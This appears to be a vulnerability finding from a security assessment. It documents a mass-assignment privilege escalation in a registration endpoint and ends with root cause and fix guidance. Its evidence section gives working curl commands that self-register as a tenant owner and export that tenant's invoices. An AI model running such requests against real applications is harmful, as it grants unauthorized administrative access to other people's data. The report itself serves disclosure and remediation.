# V-11 — Mass Assignment (Privilege Escalation)

| Field | Value |
|---|---|
| **Severity** | High (CVSS 8.8) |
| **CWE** | CWE-915 — Mass Assignment |
| **Endpoint** | `POST /api/v1/auth/register` |
| **Component** | `target-app/src/auth/routes.js` |
| **Status** | Confirmed exploitable |

## Summary
The registration endpoint extracts the `role` and `tenant_id` parameters directly from the request body and inserts them into the database without authorization checks. An unauthenticated attacker can register a new account with `role: "owner"` on any tenant, granting them full administrative access to that tenant's data.

## Evidence
1. Register as owner of Acme:
   curl -s -X POST localhost:3000/api/v1/auth/register -H 'content-type: application/json' -d '{"tenant_id":"a0000001-0000-4000-8000-000000000001","email":"v11@evil.test","password":"Test123!","role":"owner"}' | jq .
   Response: 201 Created with "role": "owner".

2. Prove escalation via owner-only endpoint:
   TOKEN=$(curl -s -X POST localhost:3000/api/v1/auth/login -H 'content-type: application/json' -d '{"email":"v11@evil.test","password":"Test123!"}' | jq -r .access_token)
   curl -s -H "Authorization: Bearer $TOKEN" localhost:3000/api/v1/admin/export | jq '.invoices | length'
   Response: 5 (Acme's invoices). The control test returns 403 for an analyst, proving the endpoint is genuinely role-gated.

## Root Cause
The auth/routes.js file extracts parameters using destructuring:
const { tenant_id, email, password, role = 'analyst' } = req.body || {};
It then inserts them directly via SQL. The application trusts the client to provide its own authorization level and tenant assignment.

## Fix
Never accept role or tenant_id from the client during self-registration. Default to analyst. User creation for other roles or tenants must require an existing admin's authorization (e.g., an invitation token).
